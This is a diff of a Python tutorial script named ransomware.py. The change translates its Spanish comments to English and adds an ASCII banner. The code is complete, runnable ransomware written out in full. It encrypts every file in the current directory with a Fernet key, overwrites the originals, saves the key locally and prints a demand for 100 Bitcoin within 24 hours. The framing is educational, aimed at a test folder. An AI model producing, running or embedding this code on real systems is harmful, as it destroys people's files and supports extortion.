@@ -1,64 +1,70 @@
-# Estos son comentarios en Python, estaré utilizandolos para explicar todo el proceso.
 
-# Primero debemos importar algunas librerías que necesitaremos. 
+#  ____  ___          ___.                      ____  ___
+#  \   \/  /__________\_ |__   ___________  ____\   \/  /
+#   \     // __ \_  __ \ __ \_/ __ \_  __ \/  _ \\     / 
+#   /     \  ___/|  | \/ \_\ \  ___/|  | \(  <_> )     \ 
+#  /___/\  \___  >__|  |___  /\___  >__|   \____/___/\  \
+#        \_/   \/          \/     \/                  \_/
 
-# Librería con funciones del sistema operativo que usaremos para encontrar los archivos en las carpetas.
-import os 
+# This script encrypts all files in the current directory except for specific ones.
+# It uses the Fernet encryption method from the cryptography library.
 
-# Fernet garantiza que un mensaje cifrado con él no puede ser manipulado o leído sin la clave. 
-# Fernet es una implementación de criptografía simétrica (también conocida como "clave secreta") autentificada.
+# First, we need to import the required libraries.
+
+# The `os` library provides functions to interact with the operating system.
+# We will use it to list and manage files in the current directory.
+import os
+
+# The `Fernet` class from the `cryptography.fernet` module provides symmetric encryption.
+# Symmetric encryption uses the same key for both encryption and decryption.
 from cryptography.fernet import Fernet
-# Para contar con esta librería debemos instalarla, vaya a la terminal del sistema operativo y escriba los siguiente: pip3 install cryptography
-# pip es un instalador de paquetes para python que estará disponible si ya tiene instalado Python3.
-# Si les da error a la hora de ejecutar el ransomware, es porque deben contar con esta librería primero.
 
-# Ahora debemos encontrar los documentos encriptar en la carpeta y agregarlos a una lista
-# Esta será nuestra lista:
-files = [ ]
+# To use the `cryptography` library, you need to install it first.
+# Open your system's terminal and type: pip3 install cryptography
+# `pip` is a package manager for Python, and it will be available if Python3 is installed.
+# If the script fails due to missing libraries, ensure `cryptography` is installed.
 
-# Vamos a utilizar un for para recorrer la carpeta y agregar los archivos a la lista que ya creamos:
+# Create an empty list to store the names of files we want to encrypt.
+files = []
+
+# Loop through each file in the current directory.
 for file in os.listdir():
-	
-	# Como nuestro archivo ransomware se encuentra en la misma carpeta, debemos validar que el 
-	# archivo que estamos añadiendo a la lista no sea nuestro propio malware. Además de validar que el 
-	# archivo no sea nuestra llave de encripción que se genera más adelante en este mismo código ni el archivo que funciona para recuperar la información.
-	if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py" or file == "Ransomware.py" or file == "Decrypt.py":
+    
+    # We need to exclude the script itself, the encryption key file, and the decryption script
+    # to avoid encrypting these files.
+    if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py" or file == "Ransomware.py" or file == "Decrypt.py":
+        continue
 
-		continue
+    # Check if the item is a file and not a directory.
+    if os.path.isfile(file):
+        # Add the file to our list of files to encrypt.
+        files.append(file)
 
-	# También debemos validar que únicamente estemos añadiendo archivos y no carpetas.
-	if os.path.isfile(file):
+# Generate a new encryption key using Fernet.
+key = Fernet.generate_key()
 
-		#En caso que el archivo no sea nuestro Malware o una carpeta, entonces el archivo se añade a la lista files[ ] que ya creamos desde el inicio.
-		files.append(file) 
+# Save the encryption key to a file so it can be used later for decrypting the files.
+with open("thekey.key", "wb") as thekey:
+    thekey.write(key)
 
-#Vamos a crear la clave con la que vamos a encriptar los archivos.
-key = Fernet.generate_key() 
+# Now that we have our list of files and the encryption key, we will start encrypting the files.
 
-#Necesitamos guardar esta clave en un archivo. En este momento solo existe como variable, por lo tanto debemos guardarla de la siguiente forma:
-
-with open ("thekey.key", "wb") as thekey:
-	thekey.write(key)
-
-
-# Ya que tenemos nuestra lista de archivos y nuestra llave de encripción, VAMOS A DIVERTIRNOS UN POCO
-
-# Recorremos la lista para encriptar todos los archivos
+# Loop through each file in the list.
 for file in files:
+    # Open the file in read-binary mode to read its contents.
+    with open(file, "rb") as thefile:
+        contents = thefile.read()
 
-	# Primero se abren los archivos en modo lectura, para extraer el contenido en una variable
-	with open(file, "rb") as thefile:
+    # Encrypt the contents using the generated encryption key.
+    contents_encrypted = Fernet(key).encrypt(contents)
 
-		contents = thefile.read()
-	#Se encripta el contenido de la variable con la función de Fernet	
-	contents_encrypted = Fernet(key).encrypt(contents)
+    # Open the file in write-binary mode to overwrite it with the encrypted contents.
+    with open(file, "wb") as thefile:
+        thefile.write(contents_encrypted)
 
-	# Se abren los archivos en modo escritura para guardar el contenido ya encriptado
-	with open(file, "wb") as thefile:
-		thefile.write(contents_encrypted)
+# Print a message informing the user that all files have been encrypted.
+# The message demands a ransom in Bitcoin to recover the files.
+print("All files have been encrypted. Send me 100 Bitcoin within the next 24 hours or you will never recover your information.")
 
-# Mostramos el mensaje en el que solicitamos la recompensa por la información encriptada.
-print ("Todos los archivos han sido encriptados, envíame 100 Bitcoin en las siguientes 24 horas o nunca recuperarás tu información")
-
-# LISTO, ya tenemos los archivos de texto encriptados en la carpeta de pruebas que creamos.
-# No me creen? ejecuten este código y vayan a abrir los archivos de texto que crearon previamente.
+# The script is complete. All text files in the folder are now encrypted.
+# To verify, run this script and try opening the text files that were previously created.
